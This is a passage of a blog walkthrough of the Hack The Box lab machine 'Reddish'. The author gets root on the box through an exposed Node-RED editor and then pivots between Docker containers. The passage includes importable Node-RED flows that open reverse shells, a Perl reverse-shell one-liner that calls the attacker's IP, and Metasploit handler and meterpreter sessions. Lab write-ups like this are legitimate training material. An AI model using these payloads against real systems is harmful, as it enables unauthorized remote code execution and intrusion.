    <title>Hack-The-Box-walkthrough[reddish]</title>
    <url>/2020/07/19/reddish/</url>
    <content><![CDATA[<h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:     Linux<br>Difficulty:     Insane<br>Points:    50<br>Release: 21 Jul 2018<br>IP:    10.10.10.94</p>
<p>User Blood: 00 days, 12 hours, 36 mins, 39 seconds.<br>Root Blood: 00 days, 19 hours, 28 mins, 48 seconds.</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb46.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># nmap -sV -v -p- 10.10.10.94 --min-rate=10000</span></span><br><span class="line"></span><br><span class="line">PORT      STATE    SERVICE     VERSION</span><br><span class="line">1880/tcp  open     http        Node.js Express framework</span><br><span class="line">8181/tcp  filtered intermapper</span><br><span class="line">33752/tcp filtered unknown</span><br></pre></td></tr></table></figure>

<ul>
<li>NodeRed - port 1880</li>
</ul>
<p>NodeRed is a browser based editor to make flows for IoT devices and other technology to talk togetheri, and it runs on tcp 1880 by default.</p>
<p>send a POST with curl, and get back some json data:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># curl -X POST http://10.10.10.94:1880</span></span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;96752a0580c49f0f90f8977d70fe318c&quot;</span>,<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;::ffff:10.10.14.5&quot;</span>,<span class="string">&quot;path&quot;</span>:<span class="string">&quot;/red/&#123;id&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>this may gave me a new path to try, let’s visit following url:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.10.10.94:1880/red/96752a0580c49f0f90f8977d70fe318c</span><br></pre></td></tr></table></figure>
<p>On visiting that path, now in the Node-Red editor:</p>
<p>The editor has items grouped as “input”, “output”, “function”, “social”, “storage”, “analysis”, and “advanced”. Clicking on any given item will load a description of the item in the panel on the right.</p>
<p>Items can be dragged into the center pane, and connected with wires. Once my flow is complete, I’ll hit “Deploy”, and the flow is live. Some inputs also have a button on their left side. That item will generate its output when the button is pressed. For example, this “inject” will output a timestamp when the button is pressed.</p>
<h3 id="Code-Execution-and-getShell-in-Node-Red"><a href="#Code-Execution-and-getShell-in-Node-Red" class="headerlink" title="Code Execution and getShell in Node-Red"></a>Code Execution and getShell in Node-Red</h3><p>In playing around with the editor, built a few useful flows that will help with exploitation of Reddish. Flows show up nicely as images, but can also be imported/exported in json. Just go to the menu, import, clipboard, and paste in the json.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb47.jpg"></li>
</ul>
<p>It will initiate the connection when the the flow to output &gt; is sent to stdin of the tcp connection. The TCP connection will come back to me. Then whatever I send back is sent to exec. The output of that is formatted and a prompt is added, and then sent back into the TCP connection, where I’ll receive it. Here’s the export:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tab&quot;</span>,<span class="string">&quot;label&quot;</span>:<span class="string">&quot;Shell&quot;</span>,<span class="string">&quot;disabled&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;info&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;9754e73a.fb7f5&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tcp request&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;server&quot;</span>:<span class="string">&quot;10.10.14.9&quot;</span>,<span class="string">&quot;port&quot;</span>:<span class="string">&quot;9001&quot;</span>,<span class="string">&quot;out&quot;</span>:<span class="string">&quot;sit&quot;</span>,<span class="string">&quot;splitc&quot;</span>:<span class="string">&quot; &quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;x&quot;</span>:520,<span class="string">&quot;y&quot;</span>:80,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;df9367ea.2fd12&quot;</span>]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;df9367ea.2fd12&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;command&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;addpay&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;append&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;useSpawn&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;timer&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;oldrc&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;x&quot;</span>:170,<span class="string">&quot;y&quot;</span>:240,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;7cd3aeef.1a522&quot;</span>],[<span class="string">&quot;7cd3aeef.1a522&quot;</span>],[]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6a48f346.ccad1c&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;inject&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;topic&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;payloadType&quot;</span>:<span class="string">&quot;str&quot;</span>,<span class="string">&quot;repeat&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;crontab&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;once&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;onceDelay&quot;</span>:0.1,<span class="string">&quot;x&quot;</span>:191.5,<span class="string">&quot;y&quot;</span>:50,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;9754e73a.fb7f5&quot;</span>]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;7cd3aeef.1a522&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;template&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;results + prompt&quot;</span>,<span class="string">&quot;field&quot;</span>:<span class="string">&quot;payload&quot;</span>,<span class="string">&quot;fieldType&quot;</span>:<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;format&quot;</span>:<span class="string">&quot;handlebars&quot;</span>,<span class="string">&quot;syntax&quot;</span>:<span class="string">&quot;mustache&quot;</span>,<span class="string">&quot;template&quot;</span>:<span class="string">&quot;&#123;&#123;&#123;payload&#125;&#125;&#125;\n&gt; &quot;</span>,<span class="string">&quot;output&quot;</span>:<span class="string">&quot;str&quot;</span>,<span class="string">&quot;x&quot;</span>:440,<span class="string">&quot;y&quot;</span>:240,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;9754e73a.fb7f5&quot;</span>]]&#125;]</span><br></pre></td></tr></table></figure>

<p>first import the commads then deploy it and click the button , then i recive a shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># nc -lvp 9001</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:39270.</span><br><span class="line">&gt; id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">&gt; whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="Callback-Shell"><a href="#Callback-Shell" class="headerlink" title="Callback Shell"></a>Callback Shell</h3><p>In investigating the box, it’s incredibly bare: no python, python3, php, nc, ifconfig, netstat, arp. There is perl though.</p>
<p>I’ll use the perl reverse shell from </p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2NoZWF0LXNoZWV0L3NoZWxscy9yZXZlcnNlLXNoZWxsLWNoZWF0LXNoZWV0">PentestMonkey<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>to get a proper callback shell. The exec node runs a command. In this case, I’ll configure it to take input for the port, which is inserted into the middle of the command:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb48.jpg"></li>
</ul>
<p>looks like:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb49.jpg"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tab&quot;</span>,<span class="string">&quot;label&quot;</span>:<span class="string">&quot;Reverse_TCP&quot;</span>,<span class="string">&quot;disabled&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;info&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6caeb9ad.e39468&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;inject&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;9002&quot;</span>,<span class="string">&quot;topic&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;9002&quot;</span>,<span class="string">&quot;payloadType&quot;</span>:<span class="string">&quot;str&quot;</span>,<span class="string">&quot;repeat&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;crontab&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;once&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;onceDelay&quot;</span>:0.1,<span class="string">&quot;x&quot;</span>:150,<span class="string">&quot;y&quot;</span>:160,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;97f946aa.853548&quot;</span>]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;97f946aa.853548&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;command&quot;</span>:<span class="string">&quot;perl -e &#x27;use Socket;<span class="variable">$i</span>=\&quot;10.10.14.9\&quot;;<span class="variable">$p</span>=&quot;</span>,<span class="string">&quot;addpay&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;append&quot;</span>:<span class="string">&quot;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);&#125;;&#x27;&quot;</span>,<span class="string">&quot;useSpawn&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;timer&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;oldrc&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;perl rev shell&quot;</span>,<span class="string">&quot;x&quot;</span>:350,<span class="string">&quot;y&quot;</span>:160,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;e2dba6a9.bb9fe8&quot;</span>],[<span class="string">&quot;e2dba6a9.bb9fe8&quot;</span>],[]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;e2dba6a9.bb9fe8&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;debug&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;active&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;tosidebar&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;console&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;tostatus&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;complete&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;x&quot;</span>:570,<span class="string">&quot;y&quot;</span>:160,<span class="string">&quot;wires&quot;</span>:[]&#125;]</span><br></pre></td></tr></table></figure>

<p>first import the commads then deploy it and click the button , then i recive a shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9002</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9002</span><br><span class="line">Ncat: Listening on 0.0.0.0:9002</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:46916.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>

<h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>Since the box doesn’t have curl or wget or nc, created a file upload flow, that would callback to a given port, and then what it reads to /tmp/.df/upload:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb50.jpg"></li>
</ul>
<p>The string “9003” is not used by the TCP node, just there because needed something, and it was a good visual reminder as to what port the flow expected.</p>
<h2 id="nodered-Container"><a href="#nodered-Container" class="headerlink" title="nodered Container"></a>nodered Container</h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a>Local Enumeration</h3><p>The local box is quite bare. I’m already running as root. As mentioned before, almost none of programs I’d expect on a linux host are present. Also, none of the IP addresses match 10.10.10.94:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ip addr</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                 </span><br><span class="line">    inet 127.0.0.1/8 scope host lo                                                                                 </span><br><span class="line">       valid_lft forever preferred_lft forever                                                                       </span><br><span class="line">7: eth1@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default                              </span><br><span class="line">    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff                                                                        </span><br><span class="line">    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth1                                                                     </span><br><span class="line">       valid_lft forever preferred_lft forever                                                                                      </span><br><span class="line">9: eth0@if10: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default                                          </span><br><span class="line">    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff                                                                                      </span><br><span class="line">    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0                                                                                        </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>conclude in a container, and didn’t find much else of interest in it.<br>Since in a container, start tracking what I know about it:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb51.jpg"></li>
</ul>
<h3 id="Network-Enumeration"><a href="#Network-Enumeration" class="headerlink" title="Network Enumeration"></a>Network Enumeration</h3><p>It’s fairly clear I need to move outside this container, and since there’s no obvious path to the host, I’ll look around the environment.</p>
<ul>
<li>Check arp</li>
</ul>
<p>The arp cache shows only the two .1 ips, which are likely the host:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/net/arp</span></span><br><span class="line">IP address       HW <span class="built_in">type</span>     Flags       HW address            Mask     Device</span><br><span class="line">172.19.0.1       0x1         0x2         02:42:bc:00:fb:35     *        eth1</span><br><span class="line">172.18.0.1       0x1         0x2         02:42:de:ac:1d:ce     *        eth0</span><br></pre></td></tr></table></figure>

<ul>
<li>nmap Host</li>
</ul>
<p>uploaded a </p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FuZHJldy1kL3N0YXRpYy1iaW5hcmllcw==">statically compiled nmap<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>to check out the .1s:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.18.0.1</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 10:57 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.18.0.1</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">1880/tcp open  unknown</span><br><span class="line">MAC Address: 02:42:1F:A4:77:C3 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.01 seconds</span><br><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.19.0.1</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 10:57 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.19.0.1</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">1880/tcp filtered unknown</span><br><span class="line">MAC Address: 02:42:F2:E9:5E:A1 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.98 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>Ping Sweep</li>
</ul>
<p>Next start a ping sweep to look for other hosts/containers, and find two other hosts worth looking at in the 172.19.0.0/24 subnet. Based on my current ifconfig and my assumption about the .1s being the gateway, I can label the output leaving two unknowns:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># for i in $(seq 1 254); do (ping -c 1 172.18.0.$i | grep &quot;bytes from&quot; | cut -d&#x27;:&#x27; -f1 | cut -d&#x27; &#x27; -f4 &amp;); done</span></span><br><span class="line">172.18.0.1  &lt;-- host</span><br><span class="line">172.18.0.2  &lt;-- node-red container</span><br><span class="line"><span class="comment"># for i in $(seq 1 254); do (ping -c 1 172.19.0.$i | grep &quot;bytes from&quot; | cut -d&#x27;:&#x27; -f1 | cut -d&#x27; &#x27; -f4 &amp;); done                    </span></span><br><span class="line">172.19.0.2</span><br><span class="line">172.19.0.1  &lt;-- host</span><br><span class="line">172.19.0.3  &lt;-- nodered container</span><br><span class="line">172.19.0.4</span><br></pre></td></tr></table></figure>

<p>got two new hosts to track:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb52.jpg"></li>
</ul>
<h2 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>There’s many ways to set up tunnels to allow my pivot here. A few that come to mind are:</p>
<ul>
<li><p>Get a meterpreter session with nodered, and use the portfwd capability to tunnel from my local box into the network (like ssh tunneling).</p>
</li>
<li><p>Copy an ssh client to nodered, and ssh back into my kali box with a reverse tunnel.</p>
</li>
<li><p>Build a listening interface (likely web) with NodeRed, and use that to tunnel traffic.</p>
</li>
<li><p>Using software designed for tunneling.</p>
</li>
</ul>
<h3 id="Getting-Meterpreter"><a href="#Getting-Meterpreter" class="headerlink" title="Getting Meterpreter"></a>Getting Meterpreter</h3><p>Open a handler with payload linux/x64/shell/reverse_tcp, and catch a callback from flow:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x64/shell/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  9002             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.10.14.9</span><br><span class="line">lhost =&gt; 10.10.14.9</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.9:9002 </span><br><span class="line">[*] Sending stage (38 bytes) to 10.10.10.94</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.9:9002 -&gt; 10.10.10.94:47014) at 2020-07-25 12:40:43 -0400</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">/bin/sh: 1: j^H��j!Xu�j: not found</span><br><span class="line">/bin/sh: 1: X�H�/bin/shSH��RWH��id: not found</span><br></pre></td></tr></table></figure>

<p>For some reason, the first command run in this new shell can be garbage and fail. After making sure to get that out of the way, I’ll background the session (ctrl-z):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># ^Z</span></span><br><span class="line">Background session 1? [y/N]  y</span><br></pre></td></tr></table></figure>
<p>Metasploit has a built in upgrade path to Meterpreter using sessions -u:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; sessions -u 1</span><br><span class="line">[*] Executing <span class="string">&#x27;post/multi/manage/shell_to_meterpreter&#x27;</span> on session(s): [1]</span><br><span class="line"></span><br><span class="line">[*] Upgrading session ID: 1</span><br><span class="line">[*] Starting exploit/multi/handler</span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.9:4433 </span><br><span class="line">[*] Sending stage (985320 bytes) to 10.10.10.94</span><br><span class="line">[*] Command stager progress: 100.00% (773/773 bytes)</span><br><span class="line">msf5 exploit(multi/handler) &gt; [*] Meterpreter session 2 opened (10.10.14.9:4433 -&gt; 10.10.10.94:50690) at 2020-07-25 12:41:29 -0400</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; </span><br><span class="line">[*] Stopping exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                   Information                                             Connection</span><br><span class="line">  --  ----  ----                   -----------                                             ----------</span><br><span class="line">  1         shell x64/linux        /bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off #  10.10.14.9:9002 -&gt; 10.10.10.94:47014 (10.10.10.94)</span></span><br><span class="line"><span class="string">  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 172.18.0.2               10.10.14.9:4433 -&gt; 10.10.10.94:50690 (172.18.0.2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 exploit(multi/handler) &gt; sessions -i 2</span></span><br><span class="line"><span class="string">[*] Starting interaction with 2...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="www-redis-Containers"><a href="#www-redis-Containers" class="headerlink" title="www redis Containers"></a>www redis Containers</h2><h3 id="Note-About-IPs"><a href="#Note-About-IPs" class="headerlink" title="Note About IPs"></a>Note About IPs</h3><p>One thing to note - on each reset / boot, Docker seems to randomize the IP addresses of the three containers, nodered, www, and redis. They always seem to be .2, .3, and .4, but which is which is something I need to determine each time. For the sake of this post, I’m working with redis as .2, nodered as .3, and www as .4.</p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>Get an nmap scan of these two new hosts:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.19.0.2</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 11:19 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> reddish_composition_redis_1.reddish_composition_internal-network (172.19.0.2)                                                                       </span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  unknown</span><br><span class="line">MAC Address: 02:42:AC:13:00:02 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.49 seconds</span><br><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.19.0.4</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 11:19 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> reddish_composition_www_1.reddish_composition_internal-network (172.19.0.3)                                                                         </span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 02:42:AC:13:00:03 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.39 seconds</span><br></pre></td></tr></table></figure>

<p>can see the docker names, reddish_composition_redis_1 and reddish_composition_www_1, and the listening ports which fit for each server, 6379 for redis, and 80 for www.</p>
<h3 id="Web-Site"><a href="#Web-Site" class="headerlink" title="Web Site"></a>Web Site</h3><ul>
<li>Access<br>I’ll use the meterpreter shell to port forward localhost 80 through the session to 172.19.0.3:</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 80 -r 172.19.0.3 -p 80</span><br><span class="line">[*] Local TCP relay created: :80 &lt;-&gt; 172.19.0.3:80</span><br></pre></td></tr></table></figure>

<p>Visiting <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS8=">http://127.0.0.1/<i class="fa fa-external-link-alt"></i></span> gives the page:</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb53.jpg"></p>
</li>
<li><p>Javascript<br>Much more interesting than the displayed page is the javascript in the source:</p>
</li>
</ul>
